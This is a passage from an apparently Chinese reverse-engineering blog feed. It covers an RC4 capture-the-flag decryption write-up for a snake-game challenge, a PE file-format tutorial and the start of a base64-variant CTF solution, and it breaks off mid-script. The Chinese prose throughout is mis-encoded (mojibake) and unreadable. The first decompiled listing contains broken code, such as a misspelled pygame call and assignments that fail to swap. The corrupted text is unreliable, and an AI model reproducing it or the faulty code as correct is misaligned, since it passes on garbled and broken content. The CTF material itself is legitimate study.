class="number">155</span>]</span><br><span class="line">decrypted_data = decrypt(<span class="built_in">bytes</span>(data), key_bytes)</span><br><span class="line">running = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> running:</span><br><span class="line">    window.fill(BLACK)</span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.QUIT:</span><br><span class="line">            running = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> event.<span class="built_in">type</span> == pygame.KEYDOWN <span class="keyword">or</span> event.key == pygame.K_UP:</span><br><span class="line">            snake_direction = (<span class="number">0</span>, -SNAKE_SPEED)</span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_DOWN:</span><br><span class="line">            snake_direction = (<span class="number">0</span>, SNAKE_SPEED)</span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_LEFT:</span><br><span class="line">            snake_direction = (-SNAKE_SPEED, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_RIGHT:</span><br><span class="line">            snake_direction = (SNAKE_SPEED, <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            snake_head = (snake[<span class="number">0</span>][<span class="number">0</span>] + snake_direction[<span class="number">0</span>], snake[<span class="number">0</span>][<span class="number">1</span>] + snake_direction[<span class="number">1</span>])</span><br><span class="line">            snake.insert(<span class="number">0</span>, snake_head)</span><br><span class="line">            snake.pop()</span><br><span class="line">            <span class="keyword">if</span> snake[<span class="number">0</span>] == food:</span><br><span class="line">                food = ((random.randint(<span class="number">0</span>, WINDOW_WIDTH - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE, (random.randint(<span class="number">0</span>, WINDOW_HEIGHT - SNAKE_SIZE) // SNAKE_SIZE) * SNAKE_SIZE)</span><br><span class="line">                snake.append(snake[-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> snake[<span class="number">0</span>][<span class="number">0</span>] &lt; <span class="number">0</span> <span class="keyword">and</span> snake[<span class="number">0</span>][<span class="number">0</span>] &gt;= WINDOW_WIDTH <span class="keyword">and</span> snake[<span class="number">0</span>][<span class="number">1</span>] &lt; <span class="number">0</span> <span class="keyword">and</span> snake[<span class="number">0</span>][<span class="number">1</span>] &gt;= WINDOW_HEIGHT <span class="keyword">or</span> snake[<span class="number">0</span>] <span class="keyword">in</span> snake[<span class="number">1</span>:]:</span><br><span class="line">        running = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> snake:</span><br><span class="line">        pygame.draw.rect(window, WHITE, (segment[<span class="number">0</span>], segment[<span class="number">1</span>], SNAKE_SIZE, SNAKE_SIZE))</span><br><span class="line">    pygame.draw.rect(window, RED, (food[<span class="number">0</span>], food[<span class="number">1</span>], SNAKE_SIZE, SNAKE_SIZE))</span><br><span class="line">    score_text = font.render(<span class="string">f&#x27;&#x27;&#x27;Score: <span class="subst">&#123;<span class="built_in">len</span>(snake)&#125;</span>&#x27;&#x27;&#x27;</span>, <span class="literal">True</span>, WHITE)</span><br><span class="line">    speed_text = font.render(<span class="string">f&#x27;&#x27;&#x27;Speed: <span class="subst">&#123;SNAKE_SPEED&#125;</span>&#x27;&#x27;&#x27;</span>, <span class="literal">True</span>, WHITE)</span><br><span class="line">    window.blit(score_text, (<span class="number">10</span>, <span class="number">10</span>))</span><br><span class="line">    window.blit(speed_text, (<span class="number">10</span>, <span class="number">40</span>))</span><br><span class="line">    score = <span class="built_in">len</span>(snake)</span><br><span class="line">    <span class="keyword">if</span> score &gt;= <span class="number">9999</span>:</span><br><span class="line">        flag_text = font.render(<span class="string">&#x27;Flag: &#x27;</span> + decrypted_data.decode(), <span class="literal">True</span>, WHITE)</span><br><span class="line">        window.blit(flag_text, (<span class="number">10</span>, <span class="number">70</span>))</span><br><span class="line">    pygame.display.upate()</span><br><span class="line">    pygame.time.Clock().tick(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">pygame.quit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_data.decode())</span><br></pre></td></tr></table></figure><p>å‰ä¸‰ä¸ªå‡½æ•°ä½“æ˜¯rc4åŠ å¯†</p><p>å°†è´ªåƒè›‡ç›¸å…³çš„ä»£ç åˆ æ‰å’Œå°†key.pycé€†å‘</p><p>åä¸ºä¸‹åˆ—ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">xor_key = <span class="string">&#x27;V3rY_v3Ry_Ez&#x27;</span>  <span class="comment">#è¿™æ˜¯keyçš„å†…å®¹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = S[i]</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_stream</span>(<span class="params">S, length</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_stream = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = S[i]</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        key_stream.append(S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> key_stream</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    S = initialize(key)</span><br><span class="line">    key_stream = generate_key_stream(S, <span class="built_in">len</span>(data))</span><br><span class="line">    decrypted_data = <span class="built_in">bytes</span>([ i ^ data[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))])</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line">key_bytes = <span class="built_in">bytes</span>(<span class="built_in">ord</span>(char) <span class="keyword">for</span> char <span class="keyword">in</span> (xor_key))</span><br><span class="line"><span class="built_in">print</span>(key_bytes)</span><br><span class="line">data = [</span><br><span class="line">    <span class="number">101</span>,<span class="number">97</span>,<span class="number">39</span>,<span class="number">125</span>,<span class="number">218</span>,</span><br><span class="line">    <span class="number">172</span>,<span class="number">205</span>,<span class="number">3</span>,<span class="number">235</span>,<span class="number">195</span>,</span><br><span class="line">    <span class="number">72</span>,<span class="number">125</span>,<span class="number">89</span>, <span class="number">130</span>,<span class="number">103</span>,</span><br><span class="line">    <span class="number">213</span>,<span class="number">120</span>,<span class="number">227</span>,<span class="number">193</span>,<span class="number">67</span>,</span><br><span class="line">    <span class="number">174</span>,<span class="number">71</span>,<span class="number">162</span>,<span class="number">248</span>,<span class="number">244</span>,</span><br><span class="line">    <span class="number">12</span>,<span class="number">238</span>,<span class="number">92</span>,<span class="number">160</span>,<span class="number">203</span>,<span class="number">185</span>,<span class="number">155</span>]</span><br><span class="line"></span><br><span class="line">decrypted_data = decrypt(<span class="built_in">bytes</span>(data), key_bytes)</span><br><span class="line"><span class="comment"># flag_text = (&#x27;Flag: &#x27; + chr(decrypted_data))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_data)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ®µåç¼–è¯‘ä»£ç æœ‰é—®é¢˜</p><p>rc4çš„åˆå§‹åŒ–æ˜¯å°† s[i]ä¸j[i]äº¤æ¢ä½ç½®</p><p>è€Œåç¼–è¯‘å‡ºæ¥çš„ä»£ç **S[i] &#x3D; S[j]  S[j] &#x3D; S[i]**æ˜¯å•çº¯çš„èµ‹å€¼å¹¶æ²¡æœ‰äº¤æ¢é¡ºåº</p><p>æ‰€ä»¥æ­£ç¡®è„šæœ¬æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">xor_key = <span class="string">&#x27;V3rY_v3Ry_Ez&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        <span class="comment"># S[i] = S[j]</span></span><br><span class="line">        <span class="comment"># S[j] = S[i]</span></span><br><span class="line">        S[i],S[j] = S[j],S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_stream</span>(<span class="params">S, length</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_stream = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        <span class="comment"># S[i] = S[j]</span></span><br><span class="line">        <span class="comment"># S[j] = S[i]</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">        key_stream.append(S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">    <span class="keyword">return</span> key_stream</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    S = initialize(key)</span><br><span class="line">    key_stream = generate_key_stream(S, <span class="built_in">len</span>(data))</span><br><span class="line">    decrypted_data = <span class="built_in">bytes</span>([ i ^ data[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data))])</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line">key_bytes = <span class="built_in">bytes</span>(<span class="built_in">ord</span>(char) <span class="keyword">for</span> char <span class="keyword">in</span> (xor_key))</span><br><span class="line"><span class="comment"># key_bytes = [86,51,114,89,95,118,51,82,121,95,69,122]</span></span><br><span class="line"><span class="built_in">print</span>(key_bytes)</span><br><span class="line">data = [</span><br><span class="line">   <span class="number">101</span>,<span class="number">97</span>,<span class="number">39</span>,<span class="number">125</span>,<span class="number">218</span>,</span><br><span class="line">    <span class="number">172</span>,<span class="number">205</span>,<span class="number">3</span>,<span class="number">235</span>,<span class="number">195</span>,</span><br><span class="line">    <span class="number">72</span>,<span class="number">125</span>,<span class="number">89</span>, <span class="number">130</span>,<span class="number">103</span>,</span><br><span class="line">    <span class="number">213</span>,<span class="number">120</span>,<span class="number">227</span>,<span class="number">193</span>,<span class="number">67</span>,</span><br><span class="line">    <span class="number">174</span>,<span class="number">71</span>,<span class="number">162</span>,<span class="number">248</span>,<span class="number">244</span>,</span><br><span class="line">    <span class="number">12</span>,<span class="number">238</span>,<span class="number">92</span>,<span class="number">160</span>,<span class="number">203</span>,<span class="number">185</span>,<span class="number">155</span>]</span><br><span class="line">decrypted_data = decrypt(<span class="built_in">bytes</span>(data), key_bytes)</span><br><span class="line"><span class="comment"># flag_text = (&#x27;Flag: &#x27; + chr(decrypted_data))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_data)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€PEã€‘PEç»“æ„çš„æ€»æ¦‚ä¸æ–‡ä»¶æ ¼å¼ç‰¹å¾</title>
      <link href="/2024/07/09/PE%E7%BB%93%E6%9E%84/"/>
      <url>/2024/07/09/PE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="PE-ç»“æ„"><a href="#PE-ç»“æ„" class="headerlink" title="PE ç»“æ„"></a>PE ç»“æ„</h1><h4 id="æ€»æ¦‚"><a href="#æ€»æ¦‚" class="headerlink" title="æ€»æ¦‚"></a>æ€»æ¦‚</h4><p>å¯æ‰§è¡Œæ–‡ä»¶ï¼šå¯ä»¥ç”±æ“ä½œç³»ç»Ÿè¿›è¡ŒåŠ è½½æ‰§è¡Œçš„æ–‡ä»¶ã€‚</p><p>æ ¼å¼ï¼šWindowsï¼šPE Linuxï¼šELF</p><p>é¢†åŸŸæ¶‰åŠï¼š</p><p>â€‹ ï¼ˆ1ï¼‰ç—…æ¯’ä¸åç—…æ¯’</p><p>â€‹ ï¼ˆ2ï¼‰å¤–æŒ‚ä¸åå¤–æŒ‚</p><p>â€‹ ï¼ˆ3ï¼‰åŠ å£³ä¸è„±å£³</p><p>â€‹ ï¼ˆ4ï¼‰æ— æºç ä¿®æ”¹åŠŸèƒ½Â·è½¯ä»¶æ±‰åŒ–ç­‰ç­‰</p><h4 id="PE-æ–‡ä»¶ç‰¹å¾"><a href="#PE-æ–‡ä»¶ç‰¹å¾" class="headerlink" title="PE æ–‡ä»¶ç‰¹å¾"></a>PE æ–‡ä»¶ç‰¹å¾</h4><p>â€‹ <strong>PE æŒ‡çº¹ï¼ˆä¸è¦å…‰çœ‹åç¼€åï¼ï¼ï¼ï¼‰</strong></p><p>â€‹ <strong>å…ˆçœ‹å‰ä¸¤ä¸ªå­—èŠ‚æ˜¯ä¸æ˜¯ MZ</strong></p><p>â€‹ <strong>å†çœ‹ 3C ä½ç½®çš„ 16 è¿›åˆ¶åœ°å€</strong></p><p>â€‹ <strong>æœ€åçœ‹ 3C æ‰€æŒ‡åœ°å€å¤„çš„å‰ä¸¤ä¸ªå­—èŠ‚æ˜¯ä¸æ˜¯ PE</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E7%89%B9%E5%BE%81.png" alt="peæ–‡ä»¶æ ¼å¼ç‰¹å¾"></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe%E7%BB%93%E6%9E%84%E8%A1%A8.png" alt="peç»“æ„è¡¨"></p><h5 id="DOS-éƒ¨åˆ†"><a href="#DOS-éƒ¨åˆ†" class="headerlink" title="DOS éƒ¨åˆ†"></a>DOS éƒ¨åˆ†</h5><p>IMAGE_DOS_HEADER 64 å­—èŠ‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe03.png" alt="pe03"></p><p>DOS å— MZ å—æœ«å°¾ä¸ PE å¤´ä¸­é—´çš„éƒ¨åˆ†</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe04.png" alt="pe04"></p><h5 id="PE-æ–‡ä»¶å¤´éƒ¨åˆ†"><a href="#PE-æ–‡ä»¶å¤´éƒ¨åˆ†" class="headerlink" title="PE æ–‡ä»¶å¤´éƒ¨åˆ†"></a>PE æ–‡ä»¶å¤´éƒ¨åˆ†</h5><p>PE æ–‡ä»¶å¤´æ ‡å¿—+PE æ–‡ä»¶è¡¨å¤´+PE æ–‡ä»¶å¤´å¯é€‰éƒ¨åˆ†</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe%E5%A4%B4.png" alt="peå¤´"></p><h6 id="PE-æ–‡ä»¶å¤´æ ‡å¿—ï¼ˆDWORD-Signatureï¼‰"><a href="#PE-æ–‡ä»¶å¤´æ ‡å¿—ï¼ˆDWORD-Signatureï¼‰" class="headerlink" title="PE æ–‡ä»¶å¤´æ ‡å¿—ï¼ˆDWORD Signatureï¼‰"></a>PE æ–‡ä»¶å¤´æ ‡å¿—ï¼ˆDWORD Signatureï¼‰</h6><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe%E9%83%A8%E5%88%86-pe%E6%A0%87%E8%AE%B0.png" alt="peéƒ¨åˆ†-peæ ‡è®°"></p><h6 id="PE-æ–‡ä»¶è¡¨å¤´ï¼ˆæ ‡å‡†-PE-å¤´ï¼‰-20-å­—èŠ‚"><a href="#PE-æ–‡ä»¶è¡¨å¤´ï¼ˆæ ‡å‡†-PE-å¤´ï¼‰-20-å­—èŠ‚" class="headerlink" title="PE æ–‡ä»¶è¡¨å¤´ï¼ˆæ ‡å‡† PE å¤´ï¼‰ 20 å­—èŠ‚"></a>PE æ–‡ä»¶è¡¨å¤´ï¼ˆæ ‡å‡† PE å¤´ï¼‰ 20 å­—èŠ‚</h6><p>ï¼ˆIMAGE_FILE_HEADER FileHeader)</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe%E6%A0%87%E5%87%86pe%E5%A4%B4.png" alt="peæ ‡å‡†peå¤´"></p><p>æ ‡å‡† PE å¤´çš„ç»“æ„ä½“å½¢å¼</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%E6%A0%87%E5%87%86pe%E5%A4%B4%E7%BB%93%E6%9E%84.png" alt="æ ‡å‡†peå¤´ç»“æ„"></p><p><strong>SizeOfOptionalHeader</strong>ç”¨æ¥æ ‡è¯†<strong>æ‰©å±• PE å¤´</strong>çš„å¤§å°</p><p>ä¸ä¿®æ”¹çš„æƒ…å†µä¸‹æ˜¯<strong>32 ä½æ˜¯ 0xE0</strong>ï¼Œ<strong>64 ä½æ˜¯ 0xF0</strong>.</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%E6%A0%87%E5%87%86pe%E5%A4%B4%E4%B8%AD%E6%A0%87%E8%AF%86%E7%9A%84%E6%89%A9%E5%B1%95pe%E5%A4%B4%E5%A4%A7%E5%B0%8F.png" alt="æ ‡å‡†peå¤´ä¸­æ ‡è¯†çš„æ‰©å±•peå¤´å¤§å°"></p><h6 id="PE-æ–‡ä»¶å¤´å¯é€‰éƒ¨åˆ†ï¼ˆæ‰©å±•-PE-å¤´ï¼‰-240-224-å­—èŠ‚ï¼ˆ64-ä½-32-ä½ï¼‰"><a href="#PE-æ–‡ä»¶å¤´å¯é€‰éƒ¨åˆ†ï¼ˆæ‰©å±•-PE-å¤´ï¼‰-240-224-å­—èŠ‚ï¼ˆ64-ä½-32-ä½ï¼‰" class="headerlink" title="PE æ–‡ä»¶å¤´å¯é€‰éƒ¨åˆ†ï¼ˆæ‰©å±• PE å¤´ï¼‰ 240&#x2F;224 å­—èŠ‚ï¼ˆ64 ä½&#x2F;32 ä½ï¼‰"></a>PE æ–‡ä»¶å¤´å¯é€‰éƒ¨åˆ†ï¼ˆæ‰©å±• PE å¤´ï¼‰ 240&#x2F;224 å­—èŠ‚ï¼ˆ64 ä½&#x2F;32 ä½ï¼‰</h6><p>ï¼ˆIMAGE_OPTIONAL_HEADER32 OptionalHeader)</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%E6%89%A9%E5%B1%95PE%E5%A4%B4.png" alt="æ‰©å±•PEå¤´"></p><p>æ‰©å±• PE å¤´çš„ç»“æ„ä½“ä¸­æœ‰ä¸€ä¸ª<strong>SizeOfHeaders</strong>ï¼ˆ<strong>DOS å¤´+PE æ–‡ä»¶å¤´+èŠ‚è¡¨æŒ‰ç…§æ–‡ä»¶å¯¹é½çš„å¤§å°</strong> ï¼‰å’Œ<strong>FileAlignment</strong>ï¼ˆ<strong>æ–‡ä»¶å¯¹é½</strong>ï¼‰</p><p>ï¼ï¼ï¼<strong>SizeOfHeaders</strong>åªèƒ½æ˜¯<strong>FileAlignment</strong>çš„æ•´å€æ•°ï¼ï¼ï¼</p><p>å‡è®¾<strong>FileAlignment</strong>è®¾ä¸º<strong>200</strong>ï¼Œ<strong>SizeOfHeaders</strong>æœ‰ç”¨æ•°æ®åªæœ‰<strong>350</strong>ï¼Œä½†<strong>SizeOfHeaders</strong>çš„å€¼åªèƒ½æ˜¯<strong>400</strong>ï¼Œå‰©ä¸‹çš„ 50 å¯å¡«å†™å…¶ä»–æ•°æ®æ¥è¡¥å…¨</p><p><strong>æ–‡ä»¶å¯¹é½å¤§å°</strong>ï¼š</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/PE%E6%96%87%E4%BB%B6%E5%AF%B9%E9%BD%90%E5%80%BC.png" alt="PEæ–‡ä»¶å¯¹é½å€¼"></p><p>å›¾ä¸­æ˜¯ 00 20 è½¬æ¢æˆ 16 è¿›åˆ¶æ˜¯ 0x0200</p><p>æ‰€ä»¥<strong>FileAlignment</strong>çš„å€¼æ˜¯ 200</p><p><strong>å¤´å¤§å°ï¼š</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/pe_%E5%A4%B4%E5%A4%A7%E5%B0%8F.png" alt="pe_å¤´å¤§å°"></p><p>00 06 è½¬æ¢æˆ 16 è¿›åˆ¶æ˜¯ 0x0600</p><p>æ‰€ä»¥åœ¨ 0x600 ä¹‹åæ˜¯<strong>èŠ‚</strong>çš„æ•°æ®ã€</p><p><strong>å†…å­˜å¯¹é½å¤§å°</strong>ï¼š</p><p><strong>FileAlignment</strong>çš„å‰é¢æ˜¯<strong>SelectionAlignment</strong>ï¼ˆ<strong>å†…å­˜å¯¹é½</strong>ï¼‰</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%E6%8C%89%E7%85%A7%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90.png" alt="æŒ‰ç…§å†…å­˜å¯¹é½"></p><p><strong>çº¢è‰²</strong>éƒ¨åˆ†æ˜¯ä¹‹å‰çš„<strong>æ–‡ä»¶å¯¹é½å¤§å°</strong></p><p>å‰é¢çš„<strong>è“è‰²</strong>å°±æ˜¯<strong>å†…å­˜å¯¹é½å¤§å°</strong></p><p>æ¯ä¸ªèŠ‚ä¸­çš„æ•°æ®åŒï¼Œä½†æ˜¯å¯¹é½æ–¹å¼ä¸åŒ</p><p>å¤šå‡ºçš„å†…å­˜ç©ºé—´ç”± 0 æ¥è¡¥å……</p><p>è“è‰²éƒ¨åˆ†æ˜¯ 0x1000</p><h5 id="èŠ‚è¡¨éƒ¨åˆ†"><a href="#èŠ‚è¡¨éƒ¨åˆ†" class="headerlink" title="èŠ‚è¡¨éƒ¨åˆ†"></a>èŠ‚è¡¨éƒ¨åˆ†</h5><p>IMAGE_SECTION_HEADER 40 å­—èŠ‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%E8%8A%82%E8%A1%A8%E7%BB%93%E6%9E%84%E4%BD%93.png" alt="èŠ‚è¡¨ç»“æ„ä½“"></p><p>èŠ‚è¡¨ä¸­çš„æ•°æ®æœ‰å¾ˆå¤šä¸ªï¼Œå›¾ä¸­å°±æœ‰ 10 ç»„ï¼Œå‰©ä¸‹çš„æ˜¯ç¼–è¯‘å™¨æ’å…¥çš„æ•°æ®</p><p>èŠ‚è¡¨ä¸­çš„æ¯ä¸ªéƒ¨åˆ†éƒ½ç”± 36 ä¸ªå­—èŠ‚ç»„æˆ</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pe/%E8%8A%82%E8%A1%A8.jpg" alt="èŠ‚è¡¨"></p><h5 id="èŠ‚éƒ¨åˆ†"><a href="#èŠ‚éƒ¨åˆ†" class="headerlink" title="èŠ‚éƒ¨åˆ†"></a>èŠ‚éƒ¨åˆ†</h5><p>æ¯ä¸ªèŠ‚æ‰€å çš„ç©ºé—´ä¹Ÿéƒ½æ˜¯<strong>æŒ‰ç…§æ–‡ä»¶å¯¹é½</strong>å’Œ<strong>æŒ‰ç…§å†…å­˜å¯¹é½</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buu[ACTFæ–°ç”Ÿèµ›2020]usualCrypt</title>
      <link href="/2024/06/04/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/"/>
      <url>/2024/06/04/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/</url>
      
        <content type="html"><![CDATA[<h1 id="ACTFæ–°ç”Ÿèµ›2020-usualCrypt"><a href="#ACTFæ–°ç”Ÿèµ›2020-usualCrypt" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]usualCrypt"></a>[ACTFæ–°ç”Ÿèµ›2020]usualCrypt</h1><p>æ‰“å¼€mainå‡½æ•°</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/image-20240530175759195.png" alt="image-20240530175759195"></p><p>æŸ¥çœ‹sub_401080</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/image-20240530175917912.png" alt="image-20240530175917912"></p><p>å‘ç°æ˜¯base64åŠ å¯†</p><p>è·Ÿè¿›sub_401000</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/image-20240530175951159.png" alt="image-20240530175951159"></p><p>å‘ç°æ˜¯å°†base64çš„åºåˆ—ç æ”¹å˜äº†</p><p>å›åˆ°ä¸Šä¸€çº§æŸ¥çœ‹sub_401030</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/image-20240530180043233.png" alt="image-20240530180043233"></p><p>è¿™æ˜¯ä¸€ä¸ªå¤§å°å†™åˆ‡æ¢ç¨‹åº</p><p>å›åˆ°mainå‡½æ•°æŸ¥çœ‹aZmxhz3tignxlxj</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DusualCrypt/image-20240530180237393.png" alt="image-20240530180237393"></p><p>è¿™æ˜¯åŠ å¯†åçš„å­—ç¬¦ä¸²</p><p>æ‰€ä»¥åªè¦å°†è¿™ä¸ªå­—ç¬¦ä¸²çš„å¤§å°å†™åˆ‡æ¢å¹¶ä¸”ç”¨é­”æ”¹çš„base64è§£å¯†å°±å¾—åˆ°äº†flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">string=<span class="string">&#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;</span>.swapcase()<span class="comment">#å¤§å°å†™è½¬æ¢</span></span><br><span class="line">tables64=<span 